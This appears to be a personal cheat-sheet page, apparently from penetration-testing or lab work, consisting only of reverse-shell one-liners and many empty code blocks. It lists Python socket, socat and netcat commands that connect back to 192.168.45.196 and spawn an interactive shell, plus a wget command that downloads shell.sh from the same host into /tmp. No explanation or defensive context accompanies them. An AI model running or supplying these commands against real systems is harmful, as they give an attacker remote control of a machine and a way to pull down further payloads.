[[Editing Copy Page]]

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.196",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

```
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.45.196:80
```

```
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("192.168.45.196",80));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
```

```
execute nc 192.168.45.196 -e /bin/bash 
```

```
cd /tmp && wget http://192.168.45.196:22/shell.sh
```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```